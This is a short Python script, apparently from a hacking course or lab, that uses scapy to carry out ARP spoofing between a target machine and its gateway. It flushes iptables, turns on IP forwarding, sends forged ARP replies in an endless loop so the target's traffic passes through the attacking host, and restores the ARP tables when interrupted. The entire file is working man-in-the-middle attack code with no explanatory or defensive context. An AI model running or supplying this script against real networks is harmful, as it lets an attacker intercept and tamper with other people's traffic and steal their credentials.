import subprocess
import scapy.all as scapy
import time


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    retries = 4
    for i in range(retries):
        answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                                  verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc

    return ""

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    else:
        print("No such IP.  Please, use ip scanner")
        exit()


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    # print(packet.show())
    # print(packet.summary)
    scapy.send(packet, count=4, verbose = False)

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"
subprocess.run("iptables --flush", shell=True)
subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
try:
    sent_packets_count = 0
    #subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets", end=' ')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ............. Quitting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


# print(packet.show())
# print(packet.summary())